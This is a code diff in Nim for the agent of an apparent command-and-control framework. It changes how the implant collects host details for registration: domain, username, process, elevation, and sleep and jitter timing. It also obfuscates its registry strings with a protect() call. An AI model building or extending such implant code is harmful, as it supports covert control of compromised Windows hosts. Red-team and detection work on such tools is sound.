@@ -1,4 +1,4 @@
-import winim, os, net, strformat, strutils, registry, zippy
+import winim, os, net, strutils, registry, zippy
 
 import ../../common/[types, serialize, sequence, crypto, utils]
 import ../../modules/manager
@@ -20,7 +20,7 @@ proc getDomain(): string =
         dwSize = DWORD buffer.len
 
     GetComputerNameExW(ComputerNameDnsDomain, &buffer, &dwSize)
-    return $buffer[ 0 ..< int(dwSize)]
+    return $buffer[0 ..< int(dwSize)]
 
 # Username
 proc getUsername(): string = 
@@ -33,11 +33,12 @@ proc getUsername(): string =
     if getDomain() != "": 
         # If domain-joined, return username in format DOMAIN\USERNAME
         GetUserNameExW(NameSamCompatible, &buffer, &dwSize)
+        return $buffer[0 ..< int(dwSize)]
     else: 
         # If not domain-joined, only return USERNAME
         discard GetUsernameW(&buffer, &dwSize)
+        return $buffer[0 ..< int(dwSize) - 1]
 
-    return $buffer[0 ..< int(dwSize) - 1]
 
 # Current process name
 proc getProcessExe(): string = 
@@ -50,7 +51,7 @@ proc getProcessExe(): string =
             if GetModuleFileNameExW(hProcess, 0, buffer, MAX_PATH): 
                 # .extractFilename() from the 'os' module gets the name of the executable from the full process path
                 # We replace trailing NULL bytes to prevent them from being sent as JSON data
-                return string($buffer).extractFilename().replace("\u0000", "")
+                return ($buffer).extractFilename().replace("\u0000", "")
     finally: 
         CloseHandle(hProcess)
 
@@ -164,11 +165,11 @@ proc getProductType(): ProductType =
 
     # Using the 'registry' module, we can get the exact registry value
     case getUnicodeValue(protect("""SYSTEM\CurrentControlSet\Control\ProductOptions"""), protect("ProductType"), HKEY_LOCAL_MACHINE)
-    of "WinNT":
+    of protect("WinNT"):
         return WORKSTATION
-    of "ServerNT":
+    of protect("ServerNT"):
         return SERVER
-    of "LanmanNT": 
+    of protect("LanmanNT"): 
         return DC
 
 proc getOSVersion(): string = 
@@ -193,9 +194,9 @@ proc getOSVersion(): string =
     else:
         return protect("Unknown")
 
-proc collectAgentMetadata*(ctx: AgentCtx): AgentRegistrationData = 
+proc collectAgentMetadata*(ctx: AgentCtx): Registration = 
     
-    return AgentRegistrationData(
+    return Registration(
         header: Header(
             magic: MAGIC,
             version: VERSION, 
@@ -218,12 +219,13 @@ proc collectAgentMetadata*(ctx: AgentCtx): AgentRegistrationData =
             process: string.toBytes(getProcessExe()),
             pid: cast[uint32](getProcessId()),
             isElevated: cast[uint8](isElevated()),
-            sleep: cast[uint32](ctx.sleep),
+            sleep: cast[uint32](ctx.sleepSettings.sleepDelay),
+            jitter: cast[uint32](ctx.sleepSettings.jitter),
             modules: cast[uint32](MODULES)
         )
     )
 
-proc serializeRegistrationData*(ctx: AgentCtx, data: var AgentRegistrationData): seq[byte] = 
+proc serializeRegistrationData*(ctx: AgentCtx, data: var Registration): seq[byte] = 
 
     var packer = Packer.init()
 
@@ -239,6 +241,7 @@ proc serializeRegistrationData*(ctx: AgentCtx, data: var AgentRegistrationData):
         .add(data.metadata.pid)
         .add(data.metadata.isElevated)
         .add(data.metadata.sleep)
+        .add(data.metadata.jitter)
         .add(data.metadata.modules)
 
     let metadata = packer.pack()
